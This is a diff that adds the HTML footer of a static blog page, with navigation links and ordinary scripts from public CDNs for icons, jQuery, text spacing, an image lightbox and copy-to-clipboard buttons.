+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
